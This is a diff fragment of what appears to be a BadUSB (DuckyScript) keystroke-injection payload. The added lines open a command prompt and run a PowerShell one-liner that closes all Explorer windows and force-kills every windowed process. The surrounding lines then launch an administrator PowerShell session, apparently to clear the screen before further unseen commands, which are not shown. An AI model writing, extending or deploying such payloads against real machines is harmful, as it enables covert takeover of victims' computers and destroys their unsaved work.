@@ -8,6 +8,14 @@ REM Short 3 second delay for bad-usb to setup
 GUI r
 REM Shortcut to open windows run search bar
 DELAY 300
+STRING cmd 
+DELAY 400
+ENTER
+STRING powershell -command "(New-Object -comObject Shell.Application).Windows() | foreach-object {$_.quit()}; Get-Process | Where-Object {$_.MainWindowTitle -ne \"\"} | stop-process"
+ENTER
+STRING exit 
+ENTER
+GUI r
 STRING powershell Start-Process Powershell -Verb runAs
 REM Run Powershell as Administrator
 DELAY 100
